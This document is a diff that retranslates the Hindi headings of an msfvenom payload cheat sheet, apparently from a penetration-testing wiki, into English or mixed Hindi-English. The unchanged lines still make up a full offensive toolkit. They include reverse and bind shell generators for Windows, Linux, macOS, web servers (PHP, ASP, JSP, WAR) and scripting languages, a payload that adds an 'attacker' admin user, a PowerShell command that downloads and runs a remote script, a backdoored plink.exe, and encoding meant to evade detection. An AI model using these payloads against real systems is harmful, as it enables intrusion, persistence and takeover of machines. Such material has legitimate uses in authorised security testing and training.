@@ -4,18 +4,18 @@
 
 ---
 
-## Basic msfvenom
+## बुनियादी msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-कोई भी `-a` का उपयोग करके आर्किटेक्चर निर्दिष्ट कर सकता है या `--platform` का उपयोग कर सकता है।
+Architecture निर्दिष्ट करने के लिए `-a` या `--platform` का भी उपयोग किया जा सकता है।
 
-## Listing
+## सूचीકરણ
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-## शेलकोड बनाने के लिए सामान्य पैरामीटर
+## Shellcode बनाते समय सामान्य parameters
 ```bash
 -b "\x00\x0a\x0d"
 -f c
@@ -23,21 +23,21 @@ msfvenom -l encoders #Encoders
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
-## **विंडोज़**
+## **Windows**
 
-### **रिवर्स शेल**
+### **Reverse Shell**
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
 ```
-### बाइंड शेल
+### Bind Shell
 ```bash
 msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
 ```
-### उपयोगकर्ता बनाएं
+### User बनाएं
 ```bash
 msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```
-### CMD शेल
+### CMD Shell
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
@@ -46,22 +46,22 @@ msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ex
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
 ```
-### एन्कोडर
+### Encoder
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### निष्पादन योग्य के अंदर एम्बेडेड
+### Executable के अंदर Embedded
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
 ## Linux Payloads
 
-### रिवर्स शेल
+### Reverse Shell
 ```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
 ```
-### बाइंड शेल
+### Bind Shell
 ```bash
 msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
 ```
@@ -75,35 +75,35 @@ msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTAC
 ```bash
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
 ```
-### **बाइंड शेल**
+### **Bind Shell**
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
-## **वेब आधारित पेलोड्स**
+## **Web आधारित Payloads**
 
 ### **PHP**
 
-#### रिवर्स शेल
+#### Reverse shel**l**
 ```bash
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 ```
 ### ASP/x
 
-#### रिवर्स शेल
+#### Reverse shell
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
 ```
 ### JSP
 
-#### रिवर्स शेल
+#### Reverse shell
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
 ```
 ### WAR
 
-#### रिवर्स शेल
+#### Reverse Shell
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
 ```
@@ -111,17 +111,17 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **स्क्रिप्ट भाषा पेलोड**
+## **Script Language payloads**
 
-### **पर्ल**
+### **Perl**
 ```bash
 msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
 ```
-### **पायथन**
+### **Python**
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
 ```
-### **बैश**
+### **Bash**
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
